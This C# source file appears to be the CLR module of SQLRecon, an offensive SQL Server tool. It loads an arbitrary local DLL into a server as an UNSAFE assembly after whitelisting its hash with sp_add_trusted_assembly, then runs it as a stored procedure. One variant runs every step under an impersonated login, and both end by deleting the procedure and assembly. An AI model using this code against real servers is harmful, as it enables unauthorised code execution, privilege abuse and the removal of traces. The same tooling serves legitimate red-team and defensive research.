using System;
using System.Data.SqlClient;
using System.IO;
using System.Security.Cryptography;

namespace SQLRecon.Modules
{
    public class CLR
    { 
        SQLQuery sqlQuery = new SQLQuery();
        Configure config = new Configure();

        public string[] ConvertDLLToSQLBytes(String dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // read the DLL, create a SHA-512 hash for it and convert the DLL to SQL compatible bytes
            try
            {
                FileInfo fileinfo = new FileInfo(dll);
                Console.WriteLine("\n[+] " + dll + " is " + fileinfo.Length + " bytes, this will take a minute ...");

                // get the SHA-512 hash of the DLL so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server
                using (SHA512 SHA512 = SHA512Managed.Create())
                {
                    using (FileStream fileStream = System.IO.File.OpenRead(dll))
                    {
                        foreach (var hash in SHA512.ComputeHash(fileStream))
                        {
                            dllHash += hash.ToString("x2");
                        }
                    }
                }

                // read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                Console.WriteLine("[!] ERROR: Unable to load " + dll);
            }
            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        // this loads and execute a custom assembly against a standard sql server
        public void Standard(SqlConnection con, String dll, String function)
        {
            string sqlOutput = "";

            // first check to see if clr integration is enabled
            sqlOutput = config.Check(con, "clr enabled");
            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable CLR (enableclr).");
                return;
            }

            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
            string[] dllArr = ConvertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];

            if (dllHash.Length != 128)
            {
                Console.WriteLine("[!] ERROR: Unable to load " + dll);
                return;
            }

            // generate a new random string for the assembly name
            RandomString rs = new RandomString();
            string assem = rs.Generate(8);

            // check to see if the hash already exists
            sqlOutput = sqlQuery.ExecuteQuery(con, "SELECT hash FROM sys.trusted_assemblies where hash = 0x" + dllHash);

            if (sqlOutput.Length > 1)
            {
                Console.WriteLine("\n[!] Hash already exists in sp_add_trusted_assembly. Deleting it before moving forward.");
                sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // add the SHA-512 hash of the DLL on to the SQL server using sp_add_trusted_assembly and verify it exists
            sqlOutput = sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dll +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';" +
                    "SELECT hash FROM sys.trusted_assemblies where hash = 0x" + dllHash);

            if (sqlOutput.Contains("System.Byte[]"))
            {
                Console.WriteLine("\n[+] SUCCESS: Added SHA-512 hash for " + dll + " to sp_add_trusted_assembly.");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to add hash to sp_add_trusted_assembly.");
                return;
            }

            // drop the procedure name, which is the same as the function name if it exists already. Drop the assembly name if it exists already.
            sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
            sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");

            // create a new custom assembly and strored procedure based on the function name in the DLL
            Console.WriteLine("\n[+] Loading DLL into stored procedure '" + function + "'");
            sqlQuery.ExecuteQuery(con, "CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
            sqlQuery.ExecuteQuery(con, "CREATE PROCEDURE [dbo].[" + function + "] AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "];");
            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");


            if (sqlOutput.Contains(function))
            {
                Console.WriteLine("\n[+] SUCCESS: Added [" + assem + "].[StoredProcedures].[" + function + "]");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to load DLL into Custom Stored Procedure. Deleting assembly and stored procedure.");
                sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
                sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
            }

            // executing new custom assembly and strored procedure
            Console.WriteLine("\n[+] Executing DLL ...");
            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "EXEC " + function);

            // Cleaning up
            Console.WriteLine("\n[+] Cleaning up. Deleting DLL, stored procedure and hash from sp_add_trusted_assembly.");
            sqlQuery.ExecuteQuery(con, "DROP PROCEDURE IF EXISTS " + function + ";");
            sqlQuery.ExecuteQuery(con, "DROP ASSEMBLY IF EXISTS " + assem + ";");
        }

        // this loads and execute a custom assembly against a sql server using impersonation
        public void Impersonate(SqlConnection con, String dll, String function, String impersonate = "null")
        {
            string sqlOutput = "";

            // first check to see if clr integration is enabled
            sqlOutput = config.Check(con, "clr enabled", impersonate);
            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable CLR (ienableclr).");
                return;
            }

            // Get the SHA-512 hash for the DLL and convert the DLL to bytes
            string[] dllArr = ConvertDLLToSQLBytes(dll);
            string dllHash = dllArr[0];
            string dllBytes = dllArr[1];

            if (dllHash.Length != 128)
            {
                Console.WriteLine("[!] ERROR: Unable to load " + dll);
                return;
            }

            // generate a new random string for the assembly name
            RandomString rs = new RandomString();
            string assem = rs.Generate(8);

            // check to see if the hash already exists
            sqlOutput = sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT hash FROM sys.trusted_assemblies where hash = 0x" + dllHash);

            if (sqlOutput.Length > 1)
            {
                Console.WriteLine("\n[!] Hash already exists in sp_add_trusted_assembly. Deleting it before moving forward.");
                sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // add the SHA-512 hash of the DLL on to the SQL server using sp_add_trusted_assembly and verify it exists
            sqlOutput = sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';" +
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dll +
                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';" +
                 "SELECT hash FROM sys.trusted_assemblies where hash = 0x" + dllHash);

            if (sqlOutput.Contains("System.Byte[]"))
            {
                Console.WriteLine("\n[+] SUCCESS: Added SHA-512 hash for " + dll + " to sp_add_trusted_assembly.");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to add hash to sp_add_trusted_assembly.");
                return;
            }

            // drop the procedure name, which is the same as the function name if it exists already. Drop the assembly name if it exists already.
            sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP PROCEDURE IF EXISTS " + function + ";");
            sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP ASSEMBLY IF EXISTS " + assem + ";");

            // create a new custom assembly and strored procedure based on the function name in the DLL
            Console.WriteLine("\n[+] Loading DLL into stored procedure '" + function + "'");
            sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; CREATE ASSEMBLY " + assem + " FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");
            sqlQuery.ExecuteQuery(con, "CREATE PROCEDURE [dbo].[" + function + "] WITH EXECUTE AS 'dbo' AS EXTERNAL NAME [" + assem + "].[StoredProcedures].[" + function + "];");
            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';");


            if (sqlOutput.Contains(function))
            {
                Console.WriteLine("\n[+] SUCCESS: Added [" + assem + "].[StoredProcedures].[" + function + "]");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: Unable to load DLL into Custom Stored Procedure. Deleting assembly and stored procedure.");
                sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP PROCEDURE IF EXISTS " + function + ";");
                sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP ASSEMBLY IF EXISTS " + assem + ";");
            }

            // executing new custom assembly and strored procedure
            Console.WriteLine("\n[+] Executing DLL ...");
            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; EXEC " + function);

            // Cleaning up
            Console.WriteLine("\n[+] Cleaning up. Deleting DLL, stored procedure and hash from sp_add_trusted_assembly.");
            sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP PROCEDURE IF EXISTS " + function + ";");
            sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "'; DROP ASSEMBLY IF EXISTS " + assem + ";");
        }
    }
}